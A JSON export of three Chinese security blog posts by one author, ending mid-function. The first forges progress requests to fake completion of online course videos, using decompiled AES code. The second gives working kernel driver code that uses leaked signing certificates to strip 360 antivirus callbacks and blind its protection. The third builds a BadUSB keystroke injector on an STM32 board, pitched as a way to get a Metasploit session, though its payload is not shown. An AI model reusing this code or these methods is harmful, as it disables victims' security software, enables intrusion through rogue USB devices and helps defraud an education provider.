[{"id":"fce6f71914c33e6d9ddde60a988dbbf2","title":"记一次网课系统的刷课分析","content":"0x00前言        在一个夜黑风高的夜晚，表哥不想上网课了，看看有没有办法刷刷课，那就看看呗，开整。\n        本以为调调前端，看看接口就能搞定，但查看一番，该系统使用一个叫silverlight的微软.net插件开发的，居然还要IE浏览器，可手上都是win11，哪来的IE浏览器，这是看都不让看啊。\n0x01环境搭建        使用chrome的IE插件，可以是可以，但是连F12都摁不了，请求包都看不到。Edge开启IE兼容模式，发现和chrome一样，也是啥也看不到，设置浏览器代理也抓不到包。\n\n\n干脆直接抓edge进程流量，这里使用proxifire转发至bp\n\n\n刷新，舒服了，终于有请求了～～～\n0x02网课协议分析        查看几条请求包，发现此系统都是一个接口，通过xml来交互，可能这就是silverlight的特性吧。我们重点是要看看能不能挂机刷课或者直接一键完成，毕竟这可不是单纯的前端，一堆中途验证不能直接去除，经过观察，发现一条关键请求。\n\n\n        顾名思义，保存当前视频学习进度，以为改个progress字段一梭子过去就成功了，可是没想到是一点反应都没有啊，学习进度是一点都没变啊。\n\n\n        继续观察，发现每次请求的credential字段都在变，猜测里面带了时间，以为老系统仅仅是base64，一手decode，没想到是密文。\n\n\n        silverlight不是前端js加密，一手谷歌，发现可以反编译silverlight资源，在html源码中搜索”.xap”，下载之～\n\n\n        将xap改为zip，解压，既然是.net，就用dnspy进行反编译，因为没接触过silverlight，打开后一堆代码，不清楚文件结构，直接搜索credential关键字，最终还是定位到了关键代码。\n发现是aes加密，这里确实是带了时间戳，怪不得每次请求都不一样\n\n\n密钥和盐也都是在的。\n\n\n        本来打算用python搞个脚本解密看看对不对先，没想到代码里带了一些东西，并不是使用库带个密钥就能解，也是懒得看了，既然是.net程序，正好手上有.net开发环境，直接cv大法，将加解密代码直接复制到一个.net项目，如果缺少的话就直接引用，没想到都是c#自身的库，那就好办了，直接实现加解密。\ninternal class utils\n    &#123;\n        public static string AesEncrypt(string input, string password, string salt)\n        &#123;\n            byte[] bytes &#x3D; Encoding.UTF8.GetBytes(input);\n            byte[] bytes2 &#x3D; Encoding.UTF8.GetBytes(salt);\n            string result;\n            using (AesManaged aesManaged &#x3D; new AesManaged())\n            &#123;\n                Rfc2898DeriveBytes rfc2898DeriveBytes &#x3D; new Rfc2898DeriveBytes(password, bytes2);\n                aesManaged.BlockSize &#x3D; aesManaged.LegalBlockSizes[0].MaxSize;\n                aesManaged.KeySize &#x3D; aesManaged.LegalKeySizes[0].MaxSize;\n                aesManaged.Key &#x3D; rfc2898DeriveBytes.GetBytes(aesManaged.KeySize &#x2F; 8);\n                aesManaged.IV &#x3D; rfc2898DeriveBytes.GetBytes(aesManaged.BlockSize &#x2F; 8);\n                using (ICryptoTransform cryptoTransform &#x3D; aesManaged.CreateEncryptor())\n                &#123;\n                    MemoryStream memoryStream &#x3D; new MemoryStream();\n                    using (CryptoStream cryptoStream &#x3D; new CryptoStream(memoryStream, cryptoTransform, (CryptoStreamMode)1))\n                    &#123;\n                        cryptoStream.Write(bytes, 0, bytes.Length);\n                    &#125;\n                    result &#x3D; Convert.ToBase64String(memoryStream.ToArray());\n                &#125;\n            &#125;\n            return result;\n        &#125;\n        public static string AesDecrypt(string input, string password, string salt)\n        &#123;\n            byte[] array &#x3D; Convert.FromBase64String(input);\n            byte[] bytes &#x3D; Encoding.UTF8.GetBytes(salt);\n            string @string;\n            using (AesManaged aesManaged &#x3D; new AesManaged())\n            &#123;\n                Rfc2898DeriveBytes rfc2898DeriveBytes &#x3D; new Rfc2898DeriveBytes(password, bytes);\n                aesManaged.BlockSize &#x3D; aesManaged.LegalBlockSizes[0].MaxSize;\n                aesManaged.KeySize &#x3D; aesManaged.LegalKeySizes[0].MaxSize;\n                aesManaged.Key &#x3D; rfc2898DeriveBytes.GetBytes(aesManaged.KeySize &#x2F; 8);\n                aesManaged.IV &#x3D; rfc2898DeriveBytes.GetBytes(aesManaged.BlockSize &#x2F; 8);\n                using (ICryptoTransform cryptoTransform &#x3D; aesManaged.CreateDecryptor())\n                &#123;\n                    MemoryStream memoryStream &#x3D; new MemoryStream();\n                    using (CryptoStream cryptoStream &#x3D; new CryptoStream(memoryStream, cryptoTransform, (CryptoStreamMode)1))\n                    &#123;\n                        cryptoStream.Write(array, 0, array.Length);\n                    &#125;\n                    byte[] array2 &#x3D; memoryStream.ToArray();\n                    @string &#x3D; Encoding.UTF8.GetString(array2, 0, array2.Length);\n                &#125;\n            &#125;\n            return @string;\n        &#125;\n    &#125;\n\n\n\n        那么现在是不是可以随意刷课了呢？答案是：不能!\n        即使修改时间重新构造请求包，响应也是一样，学习进度也是一点都没变，再回头去看请求包，这时注意到了一个字段type，将它改为1，发现响应不一样。\n\n\n虽然失败了，但是至少有变化了，再此分析，通过不断调整credential及progress字段，最后终于验证：credential里的时间跟学习进度没关系，花这么大功夫，搁这耍流氓呢！\n\n\n        经过多次尝试，发现服务端只记录请求时间，只要两次请求时间间隔和progress相差不超过一分钟就可以，那意思是只能刷课了？肯定不能啊，那我要是只请求一次，且第一次传的时长等于整个视频时长呢，正好获取课程接口会返回视频时长\n\n\n那当然是直接100%，哈哈哈，只要思路广，没有网课跳不了。\n","slug":"jycwkfx","date":"2022-12-05T12:38:06.000Z","categories_index":"安全,逆向,逆向,C#","tags_index":"逆向,C#,刷课","author_index":"Pa2sw0rd"},{"id":"409b3e3714c7f3ec9e95ceb3800e7134","title":"利用签名驱动秒杀AV系统防护软件","content":"简介以往安全厂家都是利用 HOOK 内核相关内存来实现系统的监控，但是这种方式及其不稳定，杀软和病毒的对抗就成了系统的“核战”，微软在 2005 年推出 Kernel Patch Protection（称为 PatchGuard），它严重限制了第三方厂商使用内核 Hook 来检测和防止系统上的恶意软件的选择，因为在内核做修改时系统稳定性非常差。从那时起，这些杀软厂商不得不更多地依赖于内核回调函数来监控系统，其次，微软从版本 1607 开始,所有 Windows 10 及以上版本的驱动程序会被要求签名 ( https://docs.microsoft.com/en-us/windows-hardware/drivers/install/kernel-mode-code-signing-policy--windows-vista-and-later- )。这意味着 windows 都不会加载未签名或签名无效的驱动程序，但是随着近几年相关厂商签名证书被泄露的安全事件的发生，导致这些泄露的签名证书被不法分子利用，使得操作系统可以加载恶意驱动程序。\n本文利用泄露的签名证书实现对内核回调的摘除，从而达到让杀软失去防护作用的效果；本文内容仅供研究学习，请勿用于非法用途，否则造成的一切后果与作者无关！\n\n    \n\n\n内核回调分析一般常用的几个回调为:\n\nPsSetLoadImageNotifyRoutine–例程注册驱动程序提供的回调，每当加载或映射 (例如，DLL 或 EXE ）到内存时会调用该回调。\nPsSetCreateThreadNotifyRoutine–在创建新线程和删除此类线程调用该回调。\nPsSetCreateProcessNotifyRoutine–每当创建或删除进程时调用该回调\nCmRegisterCallbackEx–对注册表执行操作时都会调用该回调\n\n通过微软的官方文档可以知道，我们在设置回调时会调用相关的设置回调方法，而部分回调方法可以设置&#x2F;取消回调，我们只需要提供相关回调的指针及 remove 标志即可，对于没有提供 remove 标志的回调方法，也提供了 remove 方法，具体可以查阅微软官方文档。\n\n\n\n\n到这里就应该知道，想要摘除回调，就必须知道已设置的回调函数的指针，那么对于获取回调列表的方法呢，已经有老哥对回调进行了深入的分析，大家可以参考这篇文章 ( https://www.anquanke.com/post/id/230073 )，这里以 LoadImage 做一下介绍。在设置回调时，系统会将该回调信息加入到“PspLoadImageNotifyRoutin”数组里。\n\n\n我们只需要定位到“PspLoadImageNotifyRoutin”数组，通过遍历该数组即可获取系统所有的 LoadImage 回调。查看该数组的引用，发现其卸载回调的导出函数“PsRemoveLoadImageNotifyRoutine”引用了该数组。\n\n\n\n\n那么我们就可以根据该导出函数+特征码的方式定位该数组，这里利用 windbg 来验证一下。\n查看“PsRemoveLoadImageNotifyRoutine”，通过特征码（lea rcx,[nt!PspLoadImageNotifyRoutine]）定位数组地址\n\n\n查看该数组，发现有 8 个 loadimage 的回调\n\n\n通过 ARK 工具查看确实是 8 个\n\n\n部分代码实现上文已经对实现方法进行了一个分析，这里具体实现一下。在这里需要明白一点，回调不仅有杀软的回调，还有其它的一些回调，所以这里就需要先进行判断，再进行摘除。\n大多数阅读这篇文章的人可能已经知道，Windows 中的内存空间主要分为 Userland 内存和 Kernel 内存。当用户创建一个进程时，内核将管理该进程的虚拟内存空间，从而使其只能访问自己的虚拟地址空间，该地址仅对该进程可用。使用内核内存，情况有所不同。系统上的每个驱动程序都没有相互隔离的地址空间-它们是共享内存的，所以这里我们先遍历内核模块，根据模块名称（当然也可以是模块文件属性）来判断是否是杀软的模块，然后根据模块地址范围和回调指针来确定当前回调属于哪个模块。\n遍历系统模块，通过判断文件名称（这里以三百六为例）将该模块信息存到 pBlackMod 里，以便摘除回调时使用。\n\nVOID EnumModule()\n&#123;\n    NTSTATUS status &#x3D; STATUS_SUCCESS;\n    UNICODE_STRING tempString &#x3D; &#123; 0 &#125;;\n    ANSI_STRING ansiString;\n    pSysModInfo &#x3D; (PSYSTEM_MODULE_INFORMATION)ExAllocatePoolWithTag(PagedPool, 0x1024 * 32, &#39;sMod&#39;);\n    pBlackMod &#x3D; (PSYSTEM_MODULE_INFORMATION)ExAllocatePoolWithTag(PagedPool, 0x1024 * 32, &#39;bMod&#39;);\n    RtlInitUnicodeString(&amp;blackName, L&quot;*360*.sys&quot;);\n    if ((!pSysModInfo) || (!pBlackMod))\n    &#123;\n        DbgPrint(&quot;FAILE\\n&quot;);\n        return;\n    &#125;\n    RtlZeroMemory(pSysModInfo, 0x1024 * 32);\n    RtlZeroMemory(pBlackMod, 0x1024 * 32);\n    ULONG ulRet;\n    status &#x3D; ZwQuerySystemInformation(SystemModuleInformation, pSysModInfo, 0x1024 * 32, &amp;ulRet);\n    if (!NT_SUCCESS(status))\n    &#123;\n        DbgPrint(&quot;FAILE\\n&quot;);\n    &#125;\n    pBlackMod-&gt;Count &#x3D; 0;\n    for (ULONG i &#x3D; 0; i &lt; pSysModInfo-&gt;Count; i++)\n    &#123;\n        &#x2F;&#x2F;DbgPrint(&quot;%d\\n&quot;, i);\n        RtlInitAnsiString(&amp;ansiString, pSysModInfo-&gt;Module[i].ImageName);\n        RtlAnsiStringToUnicodeString(&amp;tempString, &amp;ansiString,TRUE);\n        if (FsRtlIsNameInExpression(&amp;blackName, &amp;tempString, FALSE, NULL)) &#123;\n            pBlackMod-&gt;Count +&#x3D; 1;\n            pBlackMod-&gt;Module[pBlackMod-&gt;Count - 1] &#x3D; pSysModInfo-&gt;Module[i];\n            &#x2F;&#x2F;DbgPrint(&quot;360模块名%s 模块基址%p 模块大小0x%x\\n&quot;,\n            &#x2F;&#x2F;    pBlackMod-&gt;Module[pBlackMod-&gt;Count - 1].ImageName,\n            &#x2F;&#x2F;    pBlackMod-&gt;Module[pBlackMod-&gt;Count - 1].Base,\n            &#x2F;&#x2F;    pBlackMod-&gt;Module[pBlackMod-&gt;Count - 1].Size\n            &#x2F;&#x2F;);\n        &#125;\n        else &#123;\n            &#x2F;*DbgPrint(&quot;模块名%s 模块基址%p 模块大小0x%x\\n&quot;,\n                pSysModInfo-&gt;Module[i].ImageName,\n                pSysModInfo-&gt;Module[i].Base,\n                pSysModInfo-&gt;Module[i].Size\n            );*&#x2F;\n        &#125;\n    &#125;\n    DbgPrint(&quot;360mod count of:%d\\n&quot;, pBlackMod-&gt;Count);\n&#125;\n因为这里我们通过符号定位相关函数地址，这里封装一个函数通过符号获取地址。\nPUCHAR GetAddressBySymbol(PCWSTR Symbol) &#123;\n    UNICODE_STRING    unstrFunc;\n    RtlInitUnicodeString(&amp;unstrFunc, Symbol);\n    return (PUCHAR)MmGetSystemRoutineAddress(&amp;unstrFunc);\n&#125;\n获取到函数地址后，通过上面对”PsRemoveLoadImageNotifyRoutine”的逆向可知，向下遍历该内存区域，即可通过特征码（0x48,0x8d,0x0d）定位数组地址。\n\nULONG64 SearchPspLoadImageNotifyRoutine()\n&#123;\n    ULONG64 pTemp &#x3D; 0;\n    ULONG64 pCheckArea &#x3D; NULL;\n    ULONG64 i &#x3D; 0;\n    pCheckArea &#x3D; (ULONG64)GetAddressBySymbol(L&quot;PsRemoveLoadImageNotifyRoutine&quot;);\n    if (pCheckArea &amp;&amp; MmIsAddressValid((PVOID)pCheckArea) &amp;&amp; MmIsAddressValid((PVOID)(pCheckArea + 0xff)))\n    &#123;\n        for (i &#x3D; pCheckArea; i &lt; pCheckArea + 0xff; i++)\n        &#123;\n            __try\n            &#123;\n                if ((*(PUCHAR)i &#x3D;&#x3D; 0x48) &amp;&amp; (*(PUCHAR)(i + 1) &#x3D;&#x3D; 0x8d) &amp;&amp; (*(PUCHAR)(i + 2) &#x3D;&#x3D; 0x0d))\n                &#123;\n                    LONG OffsetAddr &#x3D; 0;\n                    RtlCopyMemory(&amp;OffsetAddr, (PUCHAR)(i + 3), 4);\n                    pTemp &#x3D; OffsetAddr + 7 + i;\n                    return pTemp;\n                &#125;\n            &#125;\n            __except (1)\n            &#123;\n                pTemp &#x3D; NULL;\n                break;\n            &#125;\n        &#125;\n    &#125;\n    return pTemp;\n&#125;\n遍历该数组即可获取回调函数指针，这里注意一下，数组里指针指向的地址并不单单是回调函数指针，还有其它信息，所以我们需要&amp;0xfffffffffffffff8 来进行偏移得到回调指针，通过 pBlackMod 里的模块基址+大小，即可得到该模块的地址范围，如果该回调指针在该范围就摘除。\nvoid EnumLoadImageNotify()\n&#123;\n    int i &#x3D; 0;\n    BOOLEAN b;\n    ULONG64 NotifyAddr &#x3D; 0, MagicPtr &#x3D; 0;\n    ULONG64 PspLoadImageNotifyRoutine &#x3D; SearchPspLoadImageNotifyRoutine();\n    if (!PspLoadImageNotifyRoutine)\n        return;\n    for (i &#x3D; 0; i &lt; 64; i++)\n    &#123;\n        MagicPtr &#x3D; PspLoadImageNotifyRoutine + i * 8;\n        NotifyAddr &#x3D; *(PULONG64)(MagicPtr);\n        if (MmIsAddressValid((PVOID)NotifyAddr) &amp;&amp; NotifyAddr !&#x3D; 0)\n        &#123;\n            NotifyAddr &#x3D; *(PULONG64)(NotifyAddr &amp; 0xfffffffffffffff8);\n            if (MmIsAddressValid(NotifyAddr)) &#123;\n                for (int i &#x3D; 0; i &lt; pBlackMod-&gt;Count; i++) &#123;\n                    if (NotifyAddr &gt;&#x3D; (ULONG64)(pBlackMod-&gt;Module[i].Base) &amp;&amp; NotifyAddr &lt;&#x3D; (ULONG64)(pBlackMod-&gt;Module[i].Base) + pBlackMod-&gt;Module[i].Size) &#123;\n                        DbgPrint(&quot;%x-flag:%d！&quot;, NotifyAddr, RemoveImageNotify(NotifyAddr));\n                    &#125;\n                    DbgPrint(&quot;LoadImageAddr:%x！&quot;, NotifyAddr);\n                    &#x2F;&#x2F;pBuffer[i] &#x3D; NotifyAddr;\n                &#125;\n            &#125;\n        &#125;\n    &#125;\n&#125;\n总结本文基于 Win11-22000.739 版本进行测试，其它版本系统可能相关内存定位方式有所差异，还需要做更多的工作，因为兼容性问题会导致蓝屏死机，读者可自行对其它系统版本进行兼容。\n对于杀软而言，难以跟踪到每一个恶意的已签名驱动进行防护，并且无法解决 0day 漏洞的攻击。 所以应该对于驱动服务及内核回调进行有效的监控及防护。\n","slug":"kill-av-by-certdriver","date":"2022-07-07T12:00:10.000Z","categories_index":"安全,免杀,免杀,驱动","tags_index":"免杀,驱动","author_index":"Pa2sw0rd"},{"id":"68207a8407ad9919ae03a48d7f395abc","title":"路上的优盘不要捡！硬核打造BadUSB近源渗透神器，一秒上线MSF！","content":"简介&emsp; &emsp; 近期拿出吃灰的stm32f407开发板，研究学习一下hid设备的开发，来实现一个低成本的badusb，本文使用开发板来进行测试，当然有条件的小伙伴还可以进行PCB打样，打印外壳来实现一个仿真度相对高的badusb。&emsp; &emsp; BadUSB是一种伪装USB HID设备的攻击，hid设备是直接与人交互的设备，例如键盘、鼠标及游戏手柄等。不过HID设备并不一定要有人机接口，只要符合HID类别规范的设备都是HID设备。一般HID的攻击主要集中在鼠标键盘上，因为只要伪装成了用户交互设备，基本上就可以和用户的电脑进行交互，从而达到攻击的目的，而这一过程都是模拟人工操作，所以对于杀软来说就没办法进行查杀。应对这一攻击最有效的方法就是不要随意插入未知、不受信任的USB设备。&emsp; &emsp; github：https://github.com/Pa2sw0rd/stm32_keyboard_badusb\n\n环境准备\nSTM32F407ZGT6\nstm32cubeMX\nvscode\narm-gcc交叉编译器\njlink调试器\n\n初始化工程文件&emsp; &emsp;本文采用HAL库开发，使用stm32cubeMX来生成一个基本工程项目文件。&emsp; &emsp;这里使用普遍的USB2.0全速模式（FS），首先在Systen Core-RCC中配置为外部时钟。\n\n&emsp; &emsp;Connectivity-USB_OTG_FS中配置Mode为Device_Only。\n\n在Middleware-USB_DEVICE中配置Class For FS IP 为HID设备，可在配置项修改vip、pid、描述字符串等。\n\nFS的最大速率在12Mbps，USB的系统时钟要求是传输速率的四倍，因此USB的系统时钟要配置为48Mhz，这里使用外部晶振通过倍频得到，小伙伴们可以参考下图的时钟树配置（注意自己芯片的外部晶振频率）。\n\n至此，基本的一个USB工程配置完毕，根据自己的环境生成相应的工程文件即可，这里稍微增大了堆栈内存。\n\nHID描述符配置项目生成之后需要修改HID描述符，cubeMX默认生成的是鼠标设备，需要修改成键盘的描述符，报告描述符相当于HID设备的属性表。修改Middlewares\\ST\\STM32_USB_Device_Library\\Class\\HID\\Src\\usbd_hid.c中的HID_MOUSE_ReportDesc为键盘描述符，顺便修改数组大小常量HID_MOUSE_REPORT_DESC_SIZE为63。\n__ALIGN_BEGIN static uint8_t HID_MOUSE_ReportDesc[HID_MOUSE_REPORT_DESC_SIZE] __ALIGN_END &#x3D;\n&#123;\n  0x05, 0x01,&#x2F;&#x2F; USAGE_PAGE (Generic Desktop)\n  0x09, 0x06,&#x2F;&#x2F; USAGE (Keyboard)\n  0xa1, 0x01,&#x2F;&#x2F; COLLECTION (Application)\n  0x05, 0x07,&#x2F;&#x2F; USAGE_PAGE (Keyboard)\n  0x19, 0xe0,&#x2F;&#x2F; USAGE_MINIMUM (Keyboard LeftControl)\n  0x29, 0xe7,&#x2F;&#x2F; USAGE_MAXIMUM (Keyboard Right GUI)\n  0x15, 0x00,&#x2F;&#x2F; LOGICAL_MINIMUM (0)\n  0x25, 0x01,&#x2F;&#x2F; LOGICAL_MAXIMUM (1)\n  0x75, 0x01,&#x2F;&#x2F; REPORT_SIZE (1)\n  0x95, 0x08,&#x2F;&#x2F; REPORT_COUNT (8)\n  0x81, 0x02,&#x2F;&#x2F; INPUT (Data,Var,Abs)\n  0x95, 0x01,&#x2F;&#x2F; REPORT_COUNT (1)\n  0x75, 0x08,&#x2F;&#x2F; REPORT_SIZE (8)\n  0x81, 0x03,&#x2F;&#x2F; INPUT (Cnst,Var,Abs)\n  0x95, 0x05,&#x2F;&#x2F; REPORT_COUNT (5)\n  0x75, 0x01,&#x2F;&#x2F; REPORT_SIZE (1)\n  0x05, 0x08,&#x2F;&#x2F; USAGE_PAGE (LEDs)\n  0x19, 0x01,&#x2F;&#x2F; USAGE_MINIMUM (Num Lock)\n  0x29, 0x05,&#x2F;&#x2F; USAGE_MAXIMUM (Kana)\n  0x91, 0x02,&#x2F;&#x2F; OUTPUT (Data,Var,Abs)\n  0x95, 0x01,&#x2F;&#x2F; REPORT_COUNT (1)\n  0x75, 0x03,&#x2F;&#x2F; REPORT_SIZE (3)\n  0x91, 0x03,&#x2F;&#x2F; OUTPUT (Cnst,Var,Abs)\n  0x95, 0x06,&#x2F;&#x2F; REPORT_COUNT (6)\n  0x75, 0x08,&#x2F;&#x2F; REPORT_SIZE (8)\n  0x15, 0x00,&#x2F;&#x2F; LOGICAL_MINIMUM (0)\n  0x25, 0xFF,&#x2F;&#x2F; LOGICAL_MAXIMUM (255)\n  0x05, 0x07,&#x2F;&#x2F; USAGE_PAGE (Keyboard)\n  0x19, 0x00,&#x2F;&#x2F; USAGE_MINIMUM (Reserved (no event indicated))\n  0x29, 0x65,&#x2F;&#x2F; USAGE_MAXIMUM (Keyboard Application)\n  0x81, 0x00,&#x2F;&#x2F; INPUT (Data,Ary,Abs)\n  0xc0\n&#125;;\n修改USBD_HID_CfgDesc数组中的鼠标为键盘。\n\n按键数据报文处理封装上面的hid描述符决定了按键数据的报文格式，一个报文数据为8个字节，其具体意思可以描述为：\n&gt; BYTE1 -- 特殊按键\n&gt;\n&gt;     |--bit0:  Left Control是否按下，按下为1  \n&gt;\n&gt;     |--bit1:  Left Shift  是否按下，按下为1  \n&gt;\n&gt;     |--bit2:  Left Alt   是否按下，按下为1  \n&gt;\n&gt;     |--bit3:  Left GUI（Windows键） 是否按下，按下为1  \n&gt;\n&gt;     |--bit4:  Right Control是否按下，按下为1  \n&gt;\n&gt;     |--bit5:  Right Shift 是否按下，按下为1  \n&gt;\n&gt;     |--bit6:  Right Alt  是否按下，按下为1  \n&gt;\n&gt;     |--bit7:  Right GUI  是否按下，按下为1 \n&gt;\n&gt; BYTE2 -- 暂不清楚，有的地方说是保留位\n&gt;\n&gt; BYTE3--BYTE8 -- 这六个为普通按键\n第一个字节为四个功能键，只有六个字节是普通按键，也就是说，我们一次可以操作六个普通按键，可能也就是所谓的六键无冲。具体六个按键的键值可以参考usb官方文档（https://usb.org/sites/default/files/hut1_3_0.pdf），发现其键值和ASCII没啥联系，不可能写脚本的时候查表叭~~~所以这里就要自己封装一下，但好在其字母及数字部分是连续的，我们可以计算键值和ASCII的偏移来直接转码，不过特殊字符得手动处理一下喽，下面直接贴出代码，已实现常见需求，优化空间很大，小伙伴们可以自己优化一下呦~\n\nkey_parse.h#ifndef __KEY_PARSE_H\n#define __KEY_PARSE_H\n#define KEY_CONTROL 0x80&gt;&gt;3\n#define KEY_SHIFT 0x80&gt;&gt;2\n#define KEY_ALT 0X80&gt;&gt;1\n#define KEY_WIN 0X80&gt;&gt;0\n#define KEY_NULL 0x00          &#x2F;&#x2F; NULL\n#define KEY_ENTER 0x28         &#x2F;&#x2F; ENTER\n#define KEY_ESC 0x29           &#x2F;&#x2F; ESC\n#define KEY_BACKSPACE 0x2A     &#x2F;&#x2F; BACKSPACE\n#define KEY_TAB 0x2B           &#x2F;&#x2F; TAB\n#define KEY_F1 0x3A\n#define KEY_F2 0x3B\n#define KEY_F3 0x3C\n#define KEY_F4 0x3D\n#define KEY_F5 0x3E\n#define KEY_F6 0x3F\n#define KEY_F7 0x40\n#define KEY_F8 0x41\n#define KEY_F9 0x42\n#define KEY_F10 0x43\n#define KEY_F11 0x44\n#define KEY_F12 0x45\n#define KEY_PRT_SCR 0x46\n#define KEY_SCOLL_LOCK 0x47\n#define KEY_PAUSE 0x48\n#define KEY_INS 0x49\n#define KEY_HOME 0x4A\n#define KEY_PAGEUP 0x4B\n#define KEY_DEL 0x4C\n#define KEY_END 0x4D\n#define KEY_PAGEDOWN 0x4E\n#define KEY_RIGHT_ARROW 0x4F\n#define KEY_LEFT_ARROW 0x50\n#define KEY_DOWN_ARROW 0x51\n#define KEY_UP_ARROW 0x52\n#define KEY_DELAY 25&#x2F;&#x2F;HID发送延时\nstatic unsigned char key_data[8]&#x3D;&#123;0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00&#125;;&#x2F;&#x2F;hid发送缓冲数据\nunsigned char ascii_to_key(unsigned char ascii);&#x2F;&#x2F;转字母数字到一级字符，非一级字符返回0到parse_key处理\nunsigned char parse_key(unsigned char key);&#x2F;&#x2F;转二级字符（需按shift的字符）\nvoid key_print(unsigned char *string);&#x2F;&#x2F;键盘输出字符串\nvoid key_press(unsigned char key);&#x2F;&#x2F;按下功能键\nvoid key_unpress(void);&#x2F;&#x2F;弹起功能键\nvoid key_unpress_all(void);&#x2F;&#x2F;弹起所有键\nvoid pressFunction(unsigned char key);&#x2F;&#x2F;按下特殊键\n#endif\nkey_parse.c#include &quot;usbd_hid.h&quot;\n#include &quot;usb_device.h&quot;\n#include &quot;key_parse.h&quot;\nextern USBD_HandleTypeDef hUsbDeviceFS;\nunsigned char ascii_to_key(unsigned char ascii)&#123;\n    if(32&lt;&#x3D;ascii&amp;&amp;ascii&lt;&#x3D;126)&#123;\n        if(0x41&lt;&#x3D;ascii&amp;&amp;ascii&lt;&#x3D;0x5a)&#123;&#x2F;&#x2F;大写字母\n            return ascii-0x3d;\n        &#125;\n        if(0x61&lt;&#x3D;ascii&amp;&amp;ascii&lt;&#x3D;0x7a)&#123;&#x2F;&#x2F;小写字母\n            return ascii-0x5d;\n        &#125;\n        if(0x30&lt;&#x3D;ascii&amp;&amp;ascii&lt;&#x3D;0x39)&#123;&#x2F;&#x2F;数字\n            if(ascii&#x3D;&#x3D;0x30) return 0x27;\n            return ascii-0x13;\n        &#125;\n        switch (ascii)\n        &#123;\n            case &#39;-&#39;:return 0x2d;\n            case &#39;&#x3D;&#39;:return 0x2e;\n            case &#39;[&#39;:return 0x2f;\n            case &#39;]&#39;:return 0x30;\n            case &#39;;&#39;:return 0x33;\n            case 0x27:return 0x34;\n            case 0x5c:return 0x31;\n            case &#39;,&#39;:return 0x36;\n            case &#39;.&#39;:return 0x37;\n            case &#39;&#x2F;&#39;:return 0x38;\n            case &#39; &#39;:return KEY_SPACE;\n            default:return 0;\n        &#125;\n    &#125;else&#123;\n        return 0;\n    &#125;\n    return 0;\n&#125;\nunsigned char parse_key(unsigned char key)&#123;\n    &#x2F;&#x2F;unsigned char temp&#x3D;ascii_to_key(key);\n    switch (key)\n    &#123;\n        case &#39;!&#39;:return ascii_to_key(&#39;1&#39;);break;\n        case &#39;@&#39;:return ascii_to_key(&#39;2&#39;);break;\n        case &#39;#&#39;:return ascii_to_key(&#39;3&#39;);break;\n        case &#39;$&#39;:return ascii_to_key(&#39;4&#39;);break;\n        case &#39;%&#39;:return ascii_to_key(&#39;5&#39;);break;\n        case &#39;^&#39;:return ascii_to_key(&#39;6&#39;);break;\n        case &#39;&amp;&#39;:return ascii_to_key(&#39;7&#39;);break;\n        case &#39;*&#39;:return ascii_to_key(&#39;8&#39;);break;\n        case &#39;(&#39;:return ascii_to_key(&#39;9&#39;);break;\n        case &#39;)&#39;:return ascii_to_key(&#39;0&#39;);break;\n        case &#39;_&#39;:return ascii_to_key(&#39;-&#39;);break;\n        case &#39;+&#39;:return ascii_to_key(&#39;&#x3D;&#39;);break;\n        case &#39;&#123;&#39;:return ascii_to_key(&#39;[&#39;);break;\n        case &#39;&#125;&#39;:return ascii_to_key(&#39;]&#39;);break;\n        case &#39;:&#39;:return ascii_to_key(&#39;;&#39;);break;\n        case &#39;&quot;&#39;:return ascii_to_key(0x27);break;\n        case &#39;|&#39;:return ascii_to_key(0x5c);break;\n        case &#39;&lt;&#39;:return ascii_to_key(&#39;,&#39;);break;\n        case &#39;&gt;&#39;:return ascii_to_key(&#39;.&#39;);break;\n        case &#39;?&#39;:return ascii_to_key(&#39;&#x2F;&#39;);break;\n        default:return key;\n    &#125;\n    return key;\n&#125;\nvoid key_print(unsigned char *string)&#123;\n&#x2F;*\n输出字符\n*&#x2F;\n    unsigned int i,j,nextKey,temp;\n    i&#x3D;0;\n    j&#x3D;0;\n    while(string[i]!&#x3D;&#39;\\0&#39;)&#123; \n        temp&#x3D;ascii_to_key(string[i]);\n        nextKey&#x3D;ascii_to_key(string[i+1]);\n        if(temp)&#123;\n            key_data[2+j]&#x3D;temp;\n            j++;\n            if(j&#x3D;&#x3D;6)&#123;\n                j&#x3D;0;\n                USBD_HID_SendReport(&amp;hUsbDeviceFS,key_data,8);\n                HAL_Delay(KEY_DELAY);\n                key_unpress_all();\n                HAL_Delay(KEY_DELAY);\n            &#125;else if(!nextKey||parse_key(nextKey)&#x3D;&#x3D;temp)&#123;\n                j&#x3D;0;\n                USBD_HID_SendReport(&amp;hUsbDeviceFS,key_data,8);\n                HAL_Delay(KEY_DELAY);\n                key_unpress_all();\n                HAL_Delay(KEY_DELAY);\n            &#125;\n        &#125;else&#123;\n            temp&#x3D;parse_key(string[i]);\n            key_data[2+0]&#x3D;temp;\n            j++;\n            if(j&#x3D;&#x3D;6)&#123;\n                j&#x3D;0;\n                key_data[0]&#x3D;KEY_SHIFT;\n                USBD_HID_SendReport(&amp;hUsbDeviceFS,key_data,8);\n                HAL_Delay(KEY_DELAY);\n                key_unpress_all();\n                HAL_Delay(KEY_DELAY);\n            &#125;else if(nextKey||nextKey&#x3D;&#x3D;temp)&#123;\n                j&#x3D;0;\n                key_data[0]&#x3D;KEY_SHIFT;\n                USBD_HID_SendReport(&amp;hUsbDeviceFS,key_data,8);\n                HAL_Delay(KEY_DELAY);\n                key_unpress_all();\n                HAL_Delay(KEY_DELAY);\n            &#125;\n        &#125;\n        i++;\n        &#x2F;&#x2F;if(string[i]&#x3D;&#x3D;&#39;\\0&#39;) return;\n    &#125;\n&#125;\nvoid key_press(unsigned char key)&#123;\n&#x2F;*\n按下功能键盘\n*&#x2F;\n    key_data[0]&#x3D;key;\n    USBD_HID_SendReport(&amp;hUsbDeviceFS,key_data,8);\n    HAL_Delay(KEY_DELAY);\n&#125;\nvoid key_unpress(void)&#123;\n&#x2F;*\n弹起功能键盘\n*&#x2F;\n    key_data[0]&#x3D;0x00;\n    USBD_HID_SendReport(&amp;hUsbDeviceFS,key_data,8);\n&#125;\nvoid key_unpress_all(void)&#123;\n&#x2F;*\n弹起所有键\n*&#x2F;\n    for(unsigned char i&#x3D;0;i&lt;8;i++)&#123;\n        key_data[i]&#x3D;0x00;\n    &#125;\n    USBD_HID_SendReport(&amp;hUsbDeviceFS,key_data,8);\n&#125;\n\nvoid pressFunction(unsigned char key)&#123;\n    key_data[2]&#x3D;key;\n    USBD_HID_SendReport(&amp;hUsbDeviceFS,key_data,8);\n    HAL_Delay(KEY_DELAY);\n    key_unpress_all();\n    